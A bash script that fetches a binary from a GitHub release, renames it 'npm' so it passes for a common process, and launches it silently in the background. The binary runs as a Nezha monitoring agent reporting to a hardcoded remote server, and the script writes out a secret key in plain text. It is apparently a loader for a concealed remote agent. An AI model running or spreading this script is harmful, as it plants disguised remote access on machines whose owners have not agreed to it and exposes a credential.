#!/bin/bash
export NEZHA_SERVER=${NEZHA_SERVER:-'agent.oklala.filegear-sg.me'}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_KEY=${NEZHA_KEY:-'wYDxXSvb2NTykxqLjN'}             
export FILE_PATH=${FILE_PATH:-'.'}

check_download() {
ARCH=$(uname -m) && DOWNLOAD_DIR="${FILE_PATH}" && mkdir -p "$DOWNLOAD_DIR" && FILE_INFO=()
if [ "$ARCH" == "arm" ] || [ "$ARCH" == "arm64" ] || [ "$ARCH" == "aarch64" ]; then
    FILE_INFO=("https://github.com/eooce/test/releases/download/ARM/swith npm")
elif [ "$ARCH" == "amd64" ] || [ "$ARCH" == "x86_64" ] || [ "$ARCH" == "x86" ]; then
    FILE_INFO=("https://github.com/eooce/test/releases/download/bulid/swith npm")
else
    echo "Unsupported architecture: $ARCH"
    exit 1
fi
for entry in "${FILE_INFO[@]}"; do
    URL=$(echo "$entry" | cut -d ' ' -f 1)
    NEW_FILENAME=$(echo "$entry" | cut -d ' ' -f 2)
    FILENAME="$DOWNLOAD_DIR/$NEW_FILENAME"
    if [ -e "$FILENAME" ]; then
        echo -e "\e[1;32m$FILENAME 已经存在,跳过下载\e[0m"
    else
        curl -L -sS -o "$FILENAME" "$URL"
        chmod +x "$FILENAME"
        echo -e "\e[1;32m正在下载并授予权限 $FILENAME\e[0m"
    fi
done
}
check_download

run() {
    if pgrep -laf npm > /dev/null; then
        echo "哪咤客户端正在运行，跳过运行!"
    else
      nohup ${FILE_PATH}/npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} --tls --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &
        sleep 2
        echo "已执行运行哪咤客户端!"
    fi
} 
run